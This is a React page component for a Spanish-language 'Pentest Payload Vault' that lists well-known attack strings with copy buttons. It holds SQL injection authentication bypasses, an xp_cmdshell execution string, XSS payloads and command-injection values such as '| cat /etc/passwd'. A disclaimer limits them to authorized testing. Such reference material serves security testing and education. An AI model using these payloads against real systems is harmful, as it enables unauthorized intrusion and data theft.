"use client";

import { useState } from "react";

const PAYLOADS = {
    "SQL Injection (Auth Bypass)": [
        "' OR '1'='1",
        "admin' --",
        "admin' #",
        "' OR 1=1--",
        "' UNION SELECT 1, 'admin', 'password'--",
    ],
    "SQL Injection (Error Based)": [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "'; EXEC xp_cmdshell('dir');--",
    ],
    "XSS (Cross Site Scripting)": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
    ],
    "Command Injection": [
        "; ls -la",
        "| cat /etc/passwd",
        "& ping -c 10 127.0.0.1",
    ]
};

export default function PayloadVaultPage() {
    const [copied, setCopied] = useState(null);

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setCopied(text);
        setTimeout(() => setCopied(null), 2000);
    };

    return (
        <div style={{
            minHeight: "100vh",
            background: "#0a0a0a",
            color: "#e0e0e0",
            fontFamily: "'Inter', sans-serif",
            padding: "40px 20px",
            display: "flex",
            flexDirection: "column",
            alignItems: "center"
        }}>
            <div style={{ width: "100%", maxWidth: "900px" }}>
                <h1 style={{
                    textAlign: "center",
                    color: "#00ff88",
                    marginBottom: "10px",
                    fontSize: "2.5rem",
                    textShadow: "0 0 15px rgba(0, 255, 136, 0.3)"
                }}>
                    💉 Pentest Payload Vault
                </h1>
                <p style={{ textAlign: "center", color: "#888", marginBottom: "40px" }}>
                    Base de datos de vectores de ataque para auditorías de seguridad autorizadas.
                </p>

                <div style={{
                    display: "grid",
                    gridTemplateColumns: "repeat(auto-fit, minmax(400px, 1fr))",
                    gap: "30px"
                }}>
                    {Object.entries(PAYLOADS).map(([category, items]) => (
                        <div key={category} style={{
                            background: "#111",
                            border: "1px solid #333",
                            borderRadius: "12px",
                            padding: "25px",
                            boxShadow: "0 4px 20px rgba(0,0,0,0.2)"
                        }}>
                            <h2 style={{
                                marginTop: 0,
                                color: "#00ff88",
                                fontSize: "1.2rem",
                                borderBottom: "1px solid #222",
                                paddingBottom: "15px",
                                marginBottom: "20px"
                            }}>
                                {category}
                            </h2>
                            <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
                                {items.map((payload, idx) => (
                                    <div key={idx} style={{
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        background: "#050505",
                                        padding: "12px",
                                        borderRadius: "6px",
                                        border: "1px solid #222"
                                    }}>
                                        <code style={{
                                            fontFamily: "'Courier New', monospace",
                                            color: "#e0e0e0",
                                            fontSize: "0.9rem"
                                        }}>
                                            {payload}
                                        </code>
                                        <button
                                            onClick={() => copyToClipboard(payload)}
                                            style={{
                                                background: copied === payload ? "#00ff88" : "#222",
                                                color: copied === payload ? "#003300" : "#888",
                                                border: "none",
                                                borderRadius: "4px",
                                                padding: "5px 10px",
                                                cursor: "pointer",
                                                fontSize: "0.8rem",
                                                fontWeight: "bold",
                                                transition: "all 0.2s"
                                            }}
                                        >
                                            {copied === payload ? "COPIADO" : "COPY"}
                                        </button>
                                    </div>
                                ))}
                            </div>
                        </div>
                    ))}
                </div>

                <div style={{
                    marginTop: "40px",
                    padding: "20px",
                    background: "rgba(255, 204, 0, 0.1)",
                    border: "1px solid #ffcc00",
                    borderRadius: "8px",
                    color: "#ffcc00",
                    fontSize: "0.9rem",
                    textAlign: "center"
                }}>
                    ⚠️ <strong>ADVERTENCIA LEGAL:</strong> Estas herramientas son exclusivamente para pruebas de penetración autorizadas y fines educativos. El uso no autorizado contra sistemas de terceros es ilegal.
                </div>

                <a href="/herramientas" style={{
                    display: "block",
                    textAlign: "center",
                    marginTop: "60px",
                    color: "#666",
                    textDecoration: "none",
                    fontSize: "0.9rem"
                }}>
                    ← Volver a Herramientas
                </a>
            </div>
        </div>
    );
}
